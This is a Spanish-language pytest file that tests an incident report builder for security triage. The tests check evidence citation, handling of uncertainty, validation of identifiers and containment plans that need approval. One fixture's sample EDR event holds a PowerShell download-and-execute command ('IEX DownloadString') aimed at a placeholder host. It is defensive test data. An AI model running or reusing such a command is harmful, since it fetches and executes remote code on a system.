"""Contrato actual N3: conclusiones citadas, incertidumbre y procedencia.

Las fixtures anteriores confirmaban origen, brecha y cronología sin eventos.
Estas pruebas aportan eventos reales de prueba o exigen conservar la incertidumbre.
"""
from copy import deepcopy

import pytest

from src.triage.level3.incident_report_builder import IncidentReport, IncidentReportBuilder, ScopeResult
from src.triage.level3.scope_analyzer import ScopeAnalysis


@pytest.fixture
def builder():
    return IncidentReportBuilder()


@pytest.fixture
def inputs():
    key = "INC-TEST"
    ref = {"source": "edr_events", "event_id": "EVT-1002"}
    return (
        {"incident_id": key, "title": "Investigación de ejecución observada", "alert_ids": ["ALT-01"]},
        {"incident_id": key, "alert_ids": ["ALT-01"], "window": {}, "events": [
            {"source": "edr_events", "event_id": "EVT-1002", "timestamp": "2026-10-15T08:32:00Z",
             "raw": {"hostname": "WEB-ECOM01", "event_type": "process_start", "command_line": "powershell.exe IEX DownloadString('https://test.example')"}}]},
        {"incident_id": key, "patient_zero": {"statement": "WEB-ECOM01", "status": "hypothesis", "evidence": [ref]},
         "timeline": [{"timestamp": "2026-10-15T10:32:00+02:00", "event_id": "EVT-1002",
                       "description": "Ejecución observada en el frontal", "mitre": "T1059.001", "evidence": [ref]}]},
        ScopeResult(incident_id=key, hosts=[{"statement": "WEB-ECOM01", "status": "confirmed", "evidence": [ref]}]),
    )


def test_build_full_report(builder, inputs):
    report = builder.build(*inputs)
    assert isinstance(report, IncidentReport)
    assert report.incident_id == "INC-TEST"
    assert report.patient_zero == "Hipótesis: WEB-ECOM01"
    assert "No determinado" in report.initial_access
    assert len(report.containment_plan) == 1
    assert report.containment_plan[0].requires_approval


def test_include_timeline_from_reconstruction(builder, inputs):
    incident, bundle, reconstruction, scope = inputs
    reconstruction["timeline"].append(deepcopy(reconstruction["timeline"][0]))
    report = builder.build(incident, bundle, reconstruction, scope)
    assert len(report.timeline) == 1
    assert report.timeline[0].timestamp == "2026-10-15T08:32:00.000Z"
    assert report.timeline[0].event_id == "EVT-1002"
    assert report.timeline[0].mitre == "T1059.001"
    reconstruction["timeline"][0]["timestamp"] = "2026-10-15T09:00:00Z"
    with pytest.raises(ValueError, match="fecha"):
        builder.build(incident, bundle, reconstruction, scope)


def test_include_scope_and_impact(builder, inputs):
    report = builder.build(*inputs)
    assert report.scope.hosts == ["WEB-ECOM01"]
    assert "No determinado" in report.scope.business_impact
    assert report.scope.users == []


def test_preserve_identifiers(builder, inputs):
    report = builder.build(*inputs)
    assert report.alert_ids == ["ALT-01"]
    incident, bundle, reconstruction, scope = inputs
    bundle["tickets"] = [{"alert_ids": ["ALT-FOREIGN"]}]
    with pytest.raises(ValueError, match="ajenas"):
        builder.build(incident, bundle, reconstruction, scope)


def test_include_evidence_and_traceability(builder, inputs):
    report = builder.build(*inputs)
    assert "WEB-ECOM01" in report.confirmed_findings
    assert "WEB-ECOM01" in report.suspected_findings
    assert {(e.source, e.event_id) for e in report.evidence} == {("edr_events", "EVT-1002")}
    incident, bundle, reconstruction, scope = inputs
    reconstruction["patient_zero"]["evidence"][0]["event_id"] = "MISSING"
    with pytest.raises(ValueError, match="Evidencia"):
        builder.build(incident, bundle, reconstruction, scope)


def test_optional_fields_handling(builder, inputs):
    incident, bundle, reconstruction, scope = inputs
    incident["related_incidents"] = ["INC-OTHER"]
    report = builder.build(incident, bundle, reconstruction, scope)
    assert report.related_incidents == ["INC-OTHER"]
    assert report.related_incident_details[0]["status"] == "unverified"
    assert report.confidence is None  # No fabricar confianza global.
    assert report.eradication_and_recovery


def test_validate_output_schema(builder, inputs):
    report = builder.build(*inputs)
    builder.validate(report)
    assert isinstance(report.to_dict()["scope"], dict)
    assert "confidence" not in report.to_dict()


def test_incomplete_information_handling(builder):
    with pytest.raises(TypeError):
        builder.build(None, None, None, None)
    incident = {"incident_id": "INC-KNOWN", "alert_ids": ["ALT-KNOWN"]}
    report = builder.build(incident, {}, {"incident_id": "INC-KNOWN"})
    assert "No determinado" in report.patient_zero
    assert report.timeline == [] and report.containment_plan == []
    builder.validate(report)


def test_containment_plan_generation(builder, inputs):
    report = builder.build(*inputs)
    assert report.containment_plan[0].target == "WEB-ECOM01"
    assert "N2" in report.containment_plan[0].approver
    assert report.containment_plan[0].evidence[0].event_id == "EVT-1002"


def test_unverified_scope_never_confirms_breach_or_notifications(builder, inputs):
    incident, bundle, reconstruction, _ = inputs
    report = builder.build(incident, bundle, reconstruction, ScopeAnalysis(
        affected_assets=["SQL-CRM01"], affected_data="Exfiltración RGPD confirmada",
        confirmed_findings=["Supuesto compromiso"], impact_level="critical"))
    assert report.scope.hosts == []
    assert report.unverified_findings == ["Supuesto compromiso"]
    assert report.notifications == []
    assert not report.containment_plan
